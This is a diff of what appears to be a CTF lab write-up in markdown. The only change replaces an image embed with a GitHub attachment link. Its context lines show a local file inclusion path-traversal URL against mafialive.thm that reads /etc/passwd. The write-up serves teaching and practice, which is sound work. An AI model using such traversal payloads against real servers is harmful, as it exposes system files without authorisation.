@@ -53,7 +53,7 @@ Let's try filtering through size and words:
 We've succesfully exploited LFI. Let's inject the code in the URL to exfiltrate /etc/passwd
 
 `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//..//..//..//etc/passwd`
-![[Pasted image 20251031102453.png]]
+![](https://github.com/user-attachments/assets/6cbed028-1065-4057-96f3-e2ff9b687c1d)
 
 
 
